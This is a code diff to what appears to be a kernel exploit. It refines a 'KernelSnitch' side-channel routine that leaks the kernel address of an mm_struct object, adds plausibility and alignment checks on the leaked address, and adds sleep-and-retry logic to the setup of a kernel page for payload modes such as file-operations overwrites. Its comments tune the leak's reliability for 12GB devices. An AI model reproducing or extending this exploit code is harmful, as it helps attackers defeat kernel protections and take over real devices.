@@ -97,11 +97,20 @@ int is_plausible_reclaim_base(uintptr_t base) {
 
 uintptr_t kernelsnitch_stable_mm_leak(void) {
   if (!ks) {
+    pr_warning("KernelSnitch mm leak: no shared state\n");
+    return (uintptr_t)-1;
+  }
+  if (ks->state != KERNELSNITCH_COLLISIONS_FOUND) {
+    pr_warning("KernelSnitch mm leak: collisions not ready state=%d\n",
+               (int)ks->state);
     return (uintptr_t)-1;
   }
   kernelsnitch_bruteforce(ks);
   uintptr_t leaked = ks->mm_struct;
   if (leaked == (uintptr_t)-1) {
+    pr_warning("KernelSnitch mm leak: first scan found no candidate "
+               "(state=%d)\n",
+               (int)ks->state);
     return (uintptr_t)-1;
   }
   /*
@@ -113,17 +122,32 @@ uintptr_t kernelsnitch_stable_mm_leak(void) {
   ks->state = KERNELSNITCH_COLLISIONS_FOUND;
   kernelsnitch_bruteforce(ks);
   uintptr_t verify = ks->mm_struct;
-  if (verify == (uintptr_t)-1 || verify != leaked) {
-    pr_warning("KernelSnitch unstable leak=%016zx verify=%016zx\n", leaked,
-               verify);
+  if (verify == (uintptr_t)-1) {
+    pr_warning("KernelSnitch mm leak: second scan empty after first=%016zx\n",
+               leaked);
+    return (uintptr_t)-1;
+  }
+  if (verify != leaked) {
+    pr_warning("KernelSnitch mm leak: unstable first=%016zx second=%016zx\n",
+               leaked, verify);
     return (uintptr_t)-1;
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
-  if ((leaked - base) % MM_STRUCT_SZ != 0 || !is_plausible_reclaim_base(base)) {
-    pr_warning("KernelSnitch implausible leaked=%016zx base=%016zx\n", leaked,
-               base);
+  if ((leaked - base) % MM_STRUCT_SZ != 0) {
+    pr_warning("KernelSnitch mm leak: bad object alignment leaked=%016zx "
+               "base=%016zx mm_sz=0x%x\n",
+               leaked, base, (unsigned)MM_STRUCT_SZ);
     return (uintptr_t)-1;
   }
+  if (!is_plausible_reclaim_base(base)) {
+    pr_warning("KernelSnitch mm leak: implausible base leaked=%016zx "
+               "base=%016zx\n",
+               leaked, base);
+    return (uintptr_t)-1;
+  }
+  pr_info("KernelSnitch mm leak: stable leaked=%016zx base=%016zx "
+          "object_index=%zu\n",
+          leaked, base, (leaked - base) / MM_STRUCT_SZ);
   return leaked;
 }
 
@@ -939,8 +963,18 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
   SYSCHK(waitpid(child_leak, NULL, 0));
 
+  /*
+   * Let the allocator settle after free-before-leak. On 12GB devices the mm
+   * scan is noisy right after mass kill/close; a short quiet window helped
+   * recovery more than burning attempt budget.
+   */
+  usleep(150000);
+  for (int q = 0; q < 8; q++) {
+    sched_yield();
+  }
+
   if (!kernelsnitch_found_collisions(ks)) {
-    pr_warning("KernelSnitch collision finding failed\n");
+    pr_warning("KernelSnitch collision finding failed (mm stage)\n");
     kernelsnitch_cleanup(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
@@ -952,7 +986,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   uintptr_t leaked = kernelsnitch_stable_mm_leak();
   if (leaked == (uintptr_t)-1) {
-    pr_warning("KernelSnitch mm_struct leak failed\n");
+    pr_warning("KernelSnitch mm_struct leak failed (see reason above)\n");
     kernelsnitch_cleanup(ks);
     ks = NULL;
     for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
@@ -1101,6 +1135,9 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
   } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
     max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
   }
+  pr_info("kernel page prepare begin mode=%d max_attempts=%d "
+          "pipebuf=%016zx\n",
+          payload_mode, max_attempts, pipebuf_page_base);
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     size_t started_ns = gettime_ns();
     uintptr_t base = prepare_kernel_page(payload_mode);
@@ -1111,10 +1148,18 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
     if (base) {
       return base;
     }
-    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
+    pr_warning("prepare_kernel_page retry %d/%d (sleep before next)\n", attempt,
                max_attempts);
+    if (attempt < max_attempts) {
+      usleep(200000);
+      for (int q = 0; q < 4; q++) {
+        sched_yield();
+      }
+    }
   }
-  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
+  pr_warning("prepare_kernel_page did not find usable nonzero source pointers "
+             "after %d attempts\n",
+             max_attempts);
   return 0;
 }
 
